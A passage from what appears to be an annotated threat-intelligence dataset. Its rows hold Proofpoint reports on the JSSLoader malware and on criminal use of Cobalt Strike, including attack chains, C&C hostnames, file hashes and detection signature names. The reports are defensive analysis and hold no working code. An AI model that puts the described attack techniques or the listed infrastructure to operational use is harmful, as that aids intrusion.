successfully mitigated. There are, however, several prominent institutions that have either [received](https://www.wsj.com/articles/hackers-targeted-financial-sector-in-mass-extortion-campaign-11612909155) attack demonstrations or reported an impact to their operations, so it is important for companies and organizations to be prepared by having appropriate mitigations in place such as using a DoS protection service and having disaster recovery plans at the ready. *EDIT (Added on 06/11/21)* A recent [report](https://blogs.akamai.com/2021/06/the-rapid-resurgence-of-ddos-extortion-that-didnt-take-long.html ""https://blogs.akamai.com/2021/06/the-rapid-resurgence-of-ddos-extortion-that-didnt-take-long.html"") by Akamai also notes a resurgence of this activity since May 2021 and provides a great amount of details and examples on the specific nature of the DDoS traffic."
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-06-24_jssloader-recoded-and-reloaded.txt,proofpoint_2021-06-24_jssloader-recoded-and-reloaded,G0046,"JSSLoader: Recoded and Reloaded June 24, 2021 ### Key Takeaways * After a months-long absence, the malware loader JSSLoader returned in June 2021 campaigns rewritten from the .NET programming language to C++. * Rewriting the [malware](https://www.proofpoint.com/us/threat-reference/malware) could be an effort by threat actors to evade current detections. * Current TA543 campaigns delivering JSSLoader are using similar lures to those observed by Proofpoint researchers in 2019 and the emails continue to contain links to a TDS landing page. ### Overview In June 2021, Proofpoint researchers observed a new variant of the downloader JSSLoader in several campaigns impacting a variety of organizations. This version of the malware loader was rewritten from .NET to the C++ programming language. This change, while not unheard of, is not a common occurrence and could be an effort by the threat actors utilizing JSSLoader to evade current detections. JSSLoader is often dropped in the first or second stage of a campaign and has the functionality to profile infected machines and load additional payloads. The campaigns are ongoing and use similar lures to those initially observed by Proofpoint researchers in 2019. According to our data, the recent campaigns have attempted to target as many as several hundred organizations at a time across a wide range of industries, including finance, manufacturing, technology, retail, healthcare, education, and transportation. ### Malware Analysis Proofpoint researchers initially observed [JSSLoader](https://malpedia.caad.fkie.fraunhofer.de/details/win.jssloader) in September 2019. It was written in .NET at the time and being actively developed. Fast forward nearly two years and Proofpoint has now identified this latest variant of the malware loader written in C++. It has much of the same functionality as previous iterations. The following provides a more in-depth look at that early version and the changes the loader has undergone since 2019. #### 2019 Version of JSSLoader (.NET) JSSLoader is an initial access malware that was written in .NET and was named after its “JSS” namespace and “jssAdmin” command and control (C&C) panel login page: ![Graphical user interface, application, website Description automatically generated](data:image;base64_removed,) *Figure 1. JSSLoader C&C panel login page from September 27, 2019 version.* Its C&C used HTTPS requests with base64-encoded data: ![A picture containing text Description automatically generated](data:image;base64_removed,) *Figure 2. Example C&C request from September 27, 2019 version.* The initial C&C beacon contained verbose system information: ![Table Description automatically generated](data:image;base64_removed,) *Figure 3. Example system information (trimmed for readability) from September 27, 2019 version.* Its commands and functionality focused on executing a next stage executable or JavaScript: ![Text Description automatically generated](data:image;base64_removed,) *Figure 4. Commands from September 27, 2019 version.* #### 2020-2021 JSSLoader Changes (.NET) Since the initial version of JSSLoader, there have been gradual changes and improvements to the malware in successive campaigns. Morphisec wrote about some of these in a January 2021 paper titled “[Threat Profile the Evolution of the FIN7 JSSLoader (PDF)](https://www.morphisec.com/hubfs/eBooks_and_Whitepapers/FIN7%20JSSLOADER%20FINAL%20WEB.pdf). Two of the most visible changes were a switch from the verbose system information to a JSON object and the addition of new commands. For example, the JSSLoader used in a December 14, 2020 email-based campaign sent the following system information: ![Text, letter Description automatically generated](data:image;base64_removed,) *Figure 5. Example system information (formatted and trimmed for readability) from December 14, 2020 version.* While the formatting changed, the beacon contained much of the same information as the original version. In addition to the changes in the C&C protocol, several new commands were added. The focus of the new commands was still on executing a next stage: ![Text Description automatically generated](data:image;base64_removed,) *Figure 6. Commands from December 14, 2020 version.* After this December 2020 campaign, activity paused and the malware went through a redevelopment phase, according to Proofpoint’s visibility. #### June 2021 JSSLoader (C++) In June 2021, email campaigns resumed, but the JSSLoader malware had been redeveloped from using the .NET programming language to C++ (this change was also [noticed on infosec Twitter](https://twitter.com/Arkbird_SOLG/status/1400845449515372555)). It is not common for a malware to be redeveloped in a different programming language, but it does happen occasionally. Proofpoint recently [documented](https://www.proofpoint.com/us/blog/threat-insight/new-variant-buer-loader-written-rust) another initial access malware known as “Buer Loader” that was redeveloped from the C programming language to Rust. As noted in that blog post, rewriting a malware can enable threat actors to better evade existing detection capabilities. The C++ version of JSSLoader analyzed here is from a June 8, 2021 email-based campaign. It sets up “registry run” persistence using a value name of “AppJSSLoader” and has similar style of system information beacon as the later .NET versions: ![Text, letter Description automatically generated](data:image;base64_removed,) *Figure 7. Example system information (formatted and trimmed for readability) from June 8, 2021 C++ version.* The C++ version also has similar command functionality, though they switched from the “Cmd” prefix of the later .NET versions back to the “Task” prefix seen in the earlier .NET samples: ![Graphical user interface Description automatically generated with medium confidence](data:image;base64_removed,) *Figure 8. Commands from June 8, 2021 C++ version.* C&C protocol and command similarity was likely a choice to remain backwards compatible with the existing .NET version’s C&C panel software. ### Campaign Details JSSLoader appears to be exclusive to several threat actors. In fact, Proofpoint has only observed two actors using it since the first email campaign in 2019. Most of the campaigns were attributed to the threat actor tracked by Proofpoint as TA543. They are characterized by their widespread distribution with opportunistic targeting. A typical campaign contains thousands of email messages and targets several hundred organizations. The lures used by TA543 typically focus on invoices and delivery information of packages. The following sections describe and compare the original campaigns observed by Proofpoint in 2019 to the June 2021 campaigns. #### September 2019 Campaign Example On September 27, 2019 Proofpoint analysts observed a TA543 campaign spoofing Intuit branding. The threat actor used a likely compromised account for an email marketing service to send the malicious emails that purported to be invoices and contained URLs linking to a landing page hosting BlackTDS. The TDS would direct the user to the download another file, a VBS downloader, hosted on SharePoint. The VBS downloader would then download JSSLoader. During our analysis of JSSLoader, it additionally loaded a Griffon payload which is historically associated with another actor, TA3546, also known as FIN7 or Carbanak. In the following months Proofpoint analysts observed TA543 shift to primarily delivering JSSLoader and/or other loaders that were often observed downloading other TA3546-associated payloads. ![Graphical user interface, application, Teams Description automatically generated](data:image;base64_removed,) *Figure 9. TA543 email that leads to the download of JSSLoader.* #### June 2021 Campaign Example On June 8, 2021, Proofpoint analysts observed a TA543 campaign spoofing UPS branding (Figure 10). The email contained URLs linking to a Keitaro TDS landing. In turn, the landing linked to the download of a Windows Scripting File (WSF) hosted on SharePoint. If executed, it downloaded an intermediate script, which then downloaded and executed the C++ version of JSSLoader. ![Graphical user interface, application Description automatically generated](data:image;base64_removed,) *Figure 10. TA543 email sample from June 8, 2021, that leads to the download of JSSLoader.* ### Conclusion The threat actors behind JSSLoader have continuously made modifications since its debut in 2019 and are likely to continue doing so using the 2021 variant. With the redevelopment of the malware into C++, which was possibly done to evade current detections and make analysis more difficult, Proofpoint researchers have not seen the .NET version in play. Instead, researchers anticipate seeing small refinements being made to the 2021 version in future campaigns, keeping in line with the evolution of the .NET version over the past two years. **Indicators of Compromise** | **Indicator** | **Type** | **Notes** | | dd86898c784342fc11c42bea4c815cb536455ee709e7522fb64622d9171c465d | SHA256 | September 27, 2019 JSSLoader Sample | | bikweb\.com | Hostname | September 27, 2019 JSSLoader C&C | | a062a71a6268af048e474c80133f84494d06a34573c491725599fe62b25be044 | SHA256 | December 14, 2020 JSSLoader sample | | monusorge\.com | Hostname | December 14, 2020 JSSLoader C&C | | 7a17ef218eebfdd4d3e70add616adcd5b78105becd6616c88b79b261d1a78fdf | SHA256 | June 8, 2021 JSSLoader Sample | | injuryless\.com | Hostname | June 8, 2021 JSSLoader C&C | **ET Signatures** 2033072 - ET TROJAN FIN7 JSSLoader Variant Activity (POST) 2033074 - ET TROJAN FIN7 JSSLoader Variant Activity (GET) 2838606 - ETPRO TROJAN Win32/jssLoader CnC Activity 2838607 - ETPRO TROJAN Win32/jssLoader CnC Checkin 2842028 - ETPRO TROJAN JSSLoader CnC Host Checkin"
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt.txt,proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt,G0016,"Cobalt Strike: Favorite Tool from APT to Crimeware June 29, 2021 ``` *(Updated 8/18/2021 at the request of a third-party)* ``` ### Key Findings * Malicious use of Cobalt Strike in threat actor campaigns is increasing. * Threat actor use of Cobalt Strike increased 161 percent from 2019 to 2020 and remains a high-volume threat in 2021. * Cobalt Strike is currently used by more cybercrime and general commodity [malware](https://www.proofpoint.com/us/threat-reference/malware) operators than APT and espionage threat actors. ### Overview In 2021, Cobalt Strike is appearing in Proofpoint threat data more frequently than ever. Cobalt Strike is a legitimate security tool used by penetration testers to emulate threat actor activity in a network. However, it is also increasingly used by malicious actors – Proofpoint saw a 161 percent increase in threat actor use of the tool from 2019 to 2020. This aligns with [observations](https://www.recordedfuture.com/2020-adversary-infrastructure-report/) from other security firms as more threat actors adopt hacking tools in their operations. When mapped to the [MITRE ATT&CK framework](https://attack.mitre.org/matrices/enterprise/), Proofpoint’s visibility into the attack chain focuses on [Initial Access](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware), Execution, and Persistence mechanisms. That is: How are threat actors attempting to compromise hosts and what payloads are they deploying first. Our corpus of threat actor data includes criminal and state-associated threat actor groups. Based on our data, Proofpoint assesses with high confidence that Cobalt Strike is becoming increasingly popular among threat actors as an initial access payload, not just a second-stage tool threat actors use once access is achieved, with criminal threat actors making up the bulk of attributed Cobalt Strike campaigns in 2020. ### Background In December 2020, the world learned about an expansive and effective espionage campaign that successfully backdoored the popular network monitoring software SolarWinds. Investigators [revealed tools](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) used by the threat actors included Cobalt Strike Beacon. This campaign was attributed to threat actors working for Russia’s Foreign Intelligence Service – a group with Cobalt Strike in their toolbox [since at least](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2018. This high-profile activity was part of a clever attack chain enabling advanced threat actors to surreptitiously compromise a relatively small number of victims. The tool used, and customized to fit their needs, is almost a decade old but increasingly popular. Cobalt Strike [debuted](https://blog.cobaltstrike.com/2016/03/02/a-history-of-cobalt-strike-in-training-courses/) in 2012 in response to perceived gaps in an existing red team tool, the Metasploit Framework. In 2015, Cobalt Strike 3.0 launched as a standalone adversary emulation platform. By 2016, Proofpoint researchers began observing threat actors using Cobalt Strike. Historically, Cobalt Strike use in malicious operations was largely associated with well-resourced threat actors, including [large cybercrime operators](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) like TA3546 (also known as FIN7), and advanced persistent threat (APT) [groups such as TA423](https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) (also known as Leviathan or APT40). Proofpoint researchers have attributed two-thirds of identified Cobalt Strike campaigns from 2016 through 2018 to well-resourced cybercrime organizations or APT groups. That ratio decreased dramatically the following years – between 2019 and present, just 15 percent of Cobalt Strike campaigns were attributable to known threat actors. ![Chart, line chart Description automatically generated](data:image;base64_removed,) *Figure 1: Number of email messages associated with a Cobalt Strike payload observed over time. Note: 2021 figures include data through May 2021.* Threat actors can obtain Cobalt Strike in a variety of ways: purchasing it directly from the vendor’s website, which requires verification; buying a version on the dark web via various hacking forums; or using cracked, illegitimate versions of the software. In March 2020, a cracked version of Cobalt Strike 4.0 was released and made available to threat actors. ### Cobalt Strike’s Appeal Cobalt Strike is used by a diverse array of threat actors, and while it is not unusual for cybercriminal and APT actors to leverage similar tooling in their campaigns, Cobalt Strike is unique in that its built-in capabilities enable it to be quickly deployed and operationalized regardless of actor sophistication or access to human or financial resources. The job of simulating actor attacks and penetrating defenses might become a bit more straightforward when both sides are using the same tool. Cobalt Strike is also session-based — that is, if threat actors can access a host and complete an operation without needing to establish ongoing persistence, there will not be remaining artifacts on the host after it is no longer running in-memory. In essence: they can hit it and forget it. Threat actors can also use the malleability of Cobalt Strike to create customized builds that add or remove features to achieve objectives or evade detection. For example, APT29 frequently uses custom Cobalt Strike Beacon loaders to [blend in](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) with legitimate traffic or [evade analysis](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/). For defenders, customized Cobalt Strike modules often require unique signatures, so threat detection engineers may be required to play catch-up to Cobalt Strike use in the wild. Cobalt Strike is also appealing to threat actors for its inherent obfuscation. Attribution gets more difficult if everyone is using the same tool. If an organization has a red team actively making use of it, it is possible malicious traffic could be mistaken as legitimate. The software’s ease of use can improve the capabilities of less sophisticated actors. For sophisticated actors, why spend development cycles on something new when you already have a great tool for the job. Proofpoint data shows Cobalt Strike is a popular tool for everything from strategic compromises to noisy, widespread campaigns. The following examples illustrate a small sampling of the types of threat actors leveraging Cobalt Strike tracked by Proofpoint. ### Threat Actors **TA800** TA800 is a large crimeware group tracked by Proofpoint since mid-2019. This actor attempts to deliver and install banking malware or malware loaders, including The Trick and BazaLoader. In April 2020, TA800 became the first group observed distributing BazaLoader. In these early campaigns, the threat actor distributed emails with a malicious link to an executable or a landing page hosted on Google Docs with a link to an executable. The executable downloaded the BazaLoader backdoor which in turn downloaded Cobalt Strike. In February 2021, the group pivoted to distributing Cobalt Strike as a first-stage payload via malicious URLs. There has been some evidence suggesting TA800’s [NimzaLoader](https://www.proofpoint.com/us/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware)is being used to download and execute Cobalt Strike as its secondary payload. **TA547** TA547 is a crimeware actor tracked by Proofpoint since October 2017. This group appears to be interested in distributing primarily banking trojans – including The Trick and ZLoader – to various geographic regions. Since mid-2020, this actor favors using malicious Microsoft Office attachments to distribute malware. In February 2021, TA547 began distributing Cobalt Strike as a second-stage payload for command and control. **TA415** TA415 is an APT actor believed to be associated with People’s Republic of China (PRC) state interests. The group has been noted in United States court filings to be tied to PRC’s Ministry of State Security. TA415 is also known as Barium and APT41. Proofpoint identified TA415 delivering Cobalt Strike as a first-stage payload in limited campaigns during mid-2020. In September 2020, the United States Department of Justice announced the indictment of several threat actors associated with this threat group, and [detailed](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) the threat actors use of Cobalt Strike in the indictment. Based on recent [reporting by Group-IB](https://blog.group-ib.com/colunmtk_apt41), TA415 used Cobalt Strike in a campaign against an entity in the airlines sector. The following timeline provides a small sample of threat actor use of Cobalt Strike across cybercrime and APT threats. The selected events were identified based on their significance, and are not representative of the full Cobalt Strike threat landscape. ![Timeline Description automatically generated](data:image;base64_removed,) *Figure 2: Timeline of threats using Cobalt Strike. Links to the sources are available in the References section.* ### Attack Chain Proofpoint has observed dozens of threat actors using Cobalt Strike. However, like their legitimate counterparts, threat actors exhibit many attack paths and use cases of the malicious actor emulation software. Threat actors use different lure themes, threat types, droppers, and payloads. For example, the earliest Cobalt Strike campaigns distributed email threats with malicious document attachments to distribute the malware, but campaigns distributing malicious URLs directly in the email body have overtaken attachments as the more frequently utilized threat type. While instances of Cobalt Strike being sent directly as an initial payload have dramatically increased, deployment as a second stage payload remains popular. Cobalt Strike has been observed in a variety of attack chains alongside malware such as The Trick, BazaLoader, Ursnif, IcedID, and many more popular loaders. In these cases, the preceding malware typically loads and executes Cobalt Strike. Likewise, there is a wide array of techniques leveraged in cases where Cobalt Strike is delivered directly, such as via malicious macros in weaponized Office documents, compressed executables, PowerShell, dynamic data exchange (DDE), HTA/HTML files, and traffic distribution systems. After Cobalt Strike has been executed and a Beacon established for C2 communication, actors have been observed attempting to enumerate network connections and dumping Active Directory credentials as they try to move laterally to a network resource such as a Domain Controller, allowing for deployment of ransomware to all networked systems. For example, the Cobalt Strike [documentation states](https://www.cobaltstrike.com/help-beacon): Use the net dclist command to find the Domain Controller for the domain the target is joined to. Use the net view command to find targets on the domain the target is joined to. In addition to network discovery and credential dumping, Cobalt Strike Beacon also has the capability to elevate privileges, load and execute additional tools, and to inject these functions into existing running host processes to attempt to avoid detection. ### Outlook Proofpoint researchers anticipate Cobalt Strike will continue to be a commonly used tool in threat actor toolsets. According to internal data, tens of thousands of organizations have already been targeted with Cobalt Strike, based on observed campaigns. We expect this number to increase in 2021. ![Chart type: Line. TOTAL_CUST increases over time. Description automatically generated](data:image;base64_removed,) *Figure 3: Number of customers targeted by threats using Cobalt Strike* ### Conclusion Cobalt Strike is a useful tool, for legitimate security researchers and threat actors alike. Its malleability coupled with its usability makes it a robust and effective tool for siphoning data, moving laterally, and loading additional malware payloads. Cobalt Strike is not the only red team tool appearing more often in Proofpoint data. Others include Mythic, Meterpreter, and the Veil Framework. The use of publicly available tooling aligns with a broader trend observed by Proofpoint: Threat actors are using as many legitimate tools as possible, including executing Windows processes like PowerShell and WMI; injecting malicious code into legitimate binaries; and frequently using allowable services like Dropbox, Google Drive, SendGrid, and Constant Contact to host and distribute malware. #### References The following references are associated with the above timeline. January 2016 – [Odinaff: New Trojan used in high level financial attacks] (https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) May 2017 – [Microsoft Word Intruder Integrates CVE-2017-0199, Utilized by Cobalt Group to Target Financial Institutions] (https://www.proofpoint.com/us/threat-insight/post/microsoft-word-intruder-integrates-cve-2017-0199-utilized-cobalt-group-target) October 2017 – [Leviathan: Espionage actor spearphishes maritime and defense targets] (https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) April 2018 – [APT攻撃者グループ menuPass(APT10) による新たな攻撃を確認] (https://www.lac.co.jp/lacwatch/people/20180521_001638.html) November 2018 – [Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign] (https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2019 – [Seven International Cyber Defendants, Including “Apt41” Actors, Charged In Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally] (https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) November 2019 – [TA2101 plays government imposter to distribute malware to German, Italian, and US organizations] (https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us) September 2020 – [Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity] (https://us-cert.cisa.gov/ncas/alerts/aa20-258a) December 2020 – [Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor] (https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) March 2021 – [NimzaLoader: TA800’s New Initial Access Malware] (https://www.proofpoint.com/uk/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware) May 2021 – [New sophisticated email-based attack from NOBELIUM] (https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/) #### Detections Proofpoint Emerging Threats includes robust detections for Cobalt Strike. The following are a sample of our detections as they relate to the behaviors described in this report. 2028591 ET TROJAN Cobalt Strike Malleable C2 Request YouTube Profile 2028589 ET TROJAN Cobalt Strike Malleable C2 Response O365 Profile M2 2032749 ET TROJAN Cobalt Strike Malleable C2 Amazon Profile 2032746 ET TROJAN Cobalt Strike Malleable C2 QiHoo Profile 2027082 ET TROJAN Observed Malicious SSL Cert CobaltStrike C2 2023629 ET INFO Suspicious Empty SSL Certificate - Observed in Cobalt Strike 2032362 ET TROJAN Cobalt Strike Beacon Activity 2032951 ET TROJAN Observed Cobalt Strike User-Agent"
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt.txt,proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt,G0045,"Cobalt Strike: Favorite Tool from APT to Crimeware June 29, 2021 ``` *(Updated 8/18/2021 at the request of a third-party)* ``` ### Key Findings * Malicious use of Cobalt Strike in threat actor campaigns is increasing. * Threat actor use of Cobalt Strike increased 161 percent from 2019 to 2020 and remains a high-volume threat in 2021. * Cobalt Strike is currently used by more cybercrime and general commodity [malware](https://www.proofpoint.com/us/threat-reference/malware) operators than APT and espionage threat actors. ### Overview In 2021, Cobalt Strike is appearing in Proofpoint threat data more frequently than ever. Cobalt Strike is a legitimate security tool used by penetration testers to emulate threat actor activity in a network. However, it is also increasingly used by malicious actors – Proofpoint saw a 161 percent increase in threat actor use of the tool from 2019 to 2020. This aligns with [observations](https://www.recordedfuture.com/2020-adversary-infrastructure-report/) from other security firms as more threat actors adopt hacking tools in their operations. When mapped to the [MITRE ATT&CK framework](https://attack.mitre.org/matrices/enterprise/), Proofpoint’s visibility into the attack chain focuses on [Initial Access](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware), Execution, and Persistence mechanisms. That is: How are threat actors attempting to compromise hosts and what payloads are they deploying first. Our corpus of threat actor data includes criminal and state-associated threat actor groups. Based on our data, Proofpoint assesses with high confidence that Cobalt Strike is becoming increasingly popular among threat actors as an initial access payload, not just a second-stage tool threat actors use once access is achieved, with criminal threat actors making up the bulk of attributed Cobalt Strike campaigns in 2020. ### Background In December 2020, the world learned about an expansive and effective espionage campaign that successfully backdoored the popular network monitoring software SolarWinds. Investigators [revealed tools](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) used by the threat actors included Cobalt Strike Beacon. This campaign was attributed to threat actors working for Russia’s Foreign Intelligence Service – a group with Cobalt Strike in their toolbox [since at least](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2018. This high-profile activity was part of a clever attack chain enabling advanced threat actors to surreptitiously compromise a relatively small number of victims. The tool used, and customized to fit their needs, is almost a decade old but increasingly popular. Cobalt Strike [debuted](https://blog.cobaltstrike.com/2016/03/02/a-history-of-cobalt-strike-in-training-courses/) in 2012 in response to perceived gaps in an existing red team tool, the Metasploit Framework. In 2015, Cobalt Strike 3.0 launched as a standalone adversary emulation platform. By 2016, Proofpoint researchers began observing threat actors using Cobalt Strike. Historically, Cobalt Strike use in malicious operations was largely associated with well-resourced threat actors, including [large cybercrime operators](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) like TA3546 (also known as FIN7), and advanced persistent threat (APT) [groups such as TA423](https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) (also known as Leviathan or APT40). Proofpoint researchers have attributed two-thirds of identified Cobalt Strike campaigns from 2016 through 2018 to well-resourced cybercrime organizations or APT groups. That ratio decreased dramatically the following years – between 2019 and present, just 15 percent of Cobalt Strike campaigns were attributable to known threat actors. ![Chart, line chart Description automatically generated](data:image;base64_removed,) *Figure 1: Number of email messages associated with a Cobalt Strike payload observed over time. Note: 2021 figures include data through May 2021.* Threat actors can obtain Cobalt Strike in a variety of ways: purchasing it directly from the vendor’s website, which requires verification; buying a version on the dark web via various hacking forums; or using cracked, illegitimate versions of the software. In March 2020, a cracked version of Cobalt Strike 4.0 was released and made available to threat actors. ### Cobalt Strike’s Appeal Cobalt Strike is used by a diverse array of threat actors, and while it is not unusual for cybercriminal and APT actors to leverage similar tooling in their campaigns, Cobalt Strike is unique in that its built-in capabilities enable it to be quickly deployed and operationalized regardless of actor sophistication or access to human or financial resources. The job of simulating actor attacks and penetrating defenses might become a bit more straightforward when both sides are using the same tool. Cobalt Strike is also session-based — that is, if threat actors can access a host and complete an operation without needing to establish ongoing persistence, there will not be remaining artifacts on the host after it is no longer running in-memory. In essence: they can hit it and forget it. Threat actors can also use the malleability of Cobalt Strike to create customized builds that add or remove features to achieve objectives or evade detection. For example, APT29 frequently uses custom Cobalt Strike Beacon loaders to [blend in](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) with legitimate traffic or [evade analysis](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/). For defenders, customized Cobalt Strike modules often require unique signatures, so threat detection engineers may be required to play catch-up to Cobalt Strike use in the wild. Cobalt Strike is also appealing to threat actors for its inherent obfuscation. Attribution gets more difficult if everyone is using the same tool. If an organization has a red team actively making use of it, it is possible malicious traffic could be mistaken as legitimate. The software’s ease of use can improve the capabilities of less sophisticated actors. For sophisticated actors, why spend development cycles on something new when you already have a great tool for the job. Proofpoint data shows Cobalt Strike is a popular tool for everything from strategic compromises to noisy, widespread campaigns. The following examples illustrate a small sampling of the types of threat actors leveraging Cobalt Strike tracked by Proofpoint. ### Threat Actors **TA800** TA800 is a large crimeware group tracked by Proofpoint since mid-2019. This actor attempts to deliver and install banking malware or malware loaders, including The Trick and BazaLoader. In April 2020, TA800 became the first group observed distributing BazaLoader. In these early campaigns, the threat actor distributed emails with a malicious link to an executable or a landing page hosted on Google Docs with a link to an executable. The executable downloaded the BazaLoader backdoor which in turn downloaded Cobalt Strike. In February 2021, the group pivoted to distributing Cobalt Strike as a first-stage payload via malicious URLs. There has been some evidence suggesting TA800’s [NimzaLoader](https://www.proofpoint.com/us/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware)is being used to download and execute Cobalt Strike as its secondary payload. **TA547** TA547 is a crimeware actor tracked by Proofpoint since October 2017. This group appears to be interested in distributing primarily banking trojans – including The Trick and ZLoader – to various geographic regions. Since mid-2020, this actor favors using malicious Microsoft Office attachments to distribute malware. In February 2021, TA547 began distributing Cobalt Strike as a second-stage payload for command and control. **TA415** TA415 is an APT actor believed to be associated with People’s Republic of China (PRC) state interests. The group has been noted in United States court filings to be tied to PRC’s Ministry of State Security. TA415 is also known as Barium and APT41. Proofpoint identified TA415 delivering Cobalt Strike as a first-stage payload in limited campaigns during mid-2020. In September 2020, the United States Department of Justice announced the indictment of several threat actors associated with this threat group, and [detailed](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) the threat actors use of Cobalt Strike in the indictment. Based on recent [reporting by Group-IB](https://blog.group-ib.com/colunmtk_apt41), TA415 used Cobalt Strike in a campaign against an entity in the airlines sector. The following timeline provides a small sample of threat actor use of Cobalt Strike across cybercrime and APT threats. The selected events were identified based on their significance, and are not representative of the full Cobalt Strike threat landscape. ![Timeline Description automatically generated](data:image;base64_removed,) *Figure 2: Timeline of threats using Cobalt Strike. Links to the sources are available in the References section.* ### Attack Chain Proofpoint has observed dozens of threat actors using Cobalt Strike. However, like their legitimate counterparts, threat actors exhibit many attack paths and use cases of the malicious actor emulation software. Threat actors use different lure themes, threat types, droppers, and payloads. For example, the earliest Cobalt Strike campaigns distributed email threats with malicious document attachments to distribute the malware, but campaigns distributing malicious URLs directly in the email body have overtaken attachments as the more frequently utilized threat type. While instances of Cobalt Strike being sent directly as an initial payload have dramatically increased, deployment as a second stage payload remains popular. Cobalt Strike has been observed in a variety of attack chains alongside malware such as The Trick, BazaLoader, Ursnif, IcedID, and many more popular loaders. In these cases, the preceding malware typically loads and executes Cobalt Strike. Likewise, there is a wide array of techniques leveraged in cases where Cobalt Strike is delivered directly, such as via malicious macros in weaponized Office documents, compressed executables, PowerShell, dynamic data exchange (DDE), HTA/HTML files, and traffic distribution systems. After Cobalt Strike has been executed and a Beacon established for C2 communication, actors have been observed attempting to enumerate network connections and dumping Active Directory credentials as they try to move laterally to a network resource such as a Domain Controller, allowing for deployment of ransomware to all networked systems. For example, the Cobalt Strike [documentation states](https://www.cobaltstrike.com/help-beacon): Use the net dclist command to find the Domain Controller for the domain the target is joined to. Use the net view command to find targets on the domain the target is joined to. In addition to network discovery and credential dumping, Cobalt Strike Beacon also has the capability to elevate privileges, load and execute additional tools, and to inject these functions into existing running host processes to attempt to avoid detection. ### Outlook Proofpoint researchers anticipate Cobalt Strike will continue to be a commonly used tool in threat actor toolsets. According to internal data, tens of thousands of organizations have already been targeted with Cobalt Strike, based on observed campaigns. We expect this number to increase in 2021. ![Chart type: Line. TOTAL_CUST increases over time. Description automatically generated](data:image;base64_removed,) *Figure 3: Number of customers targeted by threats using Cobalt Strike* ### Conclusion Cobalt Strike is a useful tool, for legitimate security researchers and threat actors alike. Its malleability coupled with its usability makes it a robust and effective tool for siphoning data, moving laterally, and loading additional malware payloads. Cobalt Strike is not the only red team tool appearing more often in Proofpoint data. Others include Mythic, Meterpreter, and the Veil Framework. The use of publicly available tooling aligns with a broader trend observed by Proofpoint: Threat actors are using as many legitimate tools as possible, including executing Windows processes like PowerShell and WMI; injecting malicious code into legitimate binaries; and frequently using allowable services like Dropbox, Google Drive, SendGrid, and Constant Contact to host and distribute malware. #### References The following references are associated with the above timeline. January 2016 – [Odinaff: New Trojan used in high level financial attacks] (https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) May 2017 – [Microsoft Word Intruder Integrates CVE-2017-0199, Utilized by Cobalt Group to Target Financial Institutions] (https://www.proofpoint.com/us/threat-insight/post/microsoft-word-intruder-integrates-cve-2017-0199-utilized-cobalt-group-target) October 2017 – [Leviathan: Espionage actor spearphishes maritime and defense targets] (https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) April 2018 